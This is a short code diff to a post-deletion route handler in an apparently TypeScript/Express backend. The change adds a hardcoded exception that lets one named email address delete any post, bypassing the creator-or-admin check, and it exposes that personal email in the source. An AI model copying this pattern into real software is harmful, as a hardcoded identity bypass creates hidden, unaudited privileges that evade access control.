@@ -216,16 +216,18 @@ export const deletePost = async (req: AuthRequest, res: Response) => {
     console.log('[DELETE DEBUG] Post found:', post._id);
     console.log('[DELETE DEBUG] Post creator:', post.creator);
 
-    // Check if user is creator or admin
+    // Check if user is creator or admin or special user
+    const isKofi = req.user.email === 'nharnahyhaw19@gmail.com';
     const isCreator = (post.creator as any).toString() === userId.toString();
     const user = await User.findById(userId);
     const isAdmin = user?.role === 'admin';
 
     console.log('[DELETE DEBUG] IsCreator:', isCreator);
     console.log('[DELETE DEBUG] IsAdmin:', isAdmin);
+    console.log('[DELETE DEBUG] IsKofi:', isKofi);
     console.log('[DELETE DEBUG] User role:', user?.role);
 
-    if (!isCreator && !isAdmin) {
+    if (!isCreator && !isAdmin && !isKofi) {
       console.log('[DELETE DEBUG] Permission denied - not creator or admin');
       return res.status(403).json({ message: 'Only post creator or admin can delete' });
     }
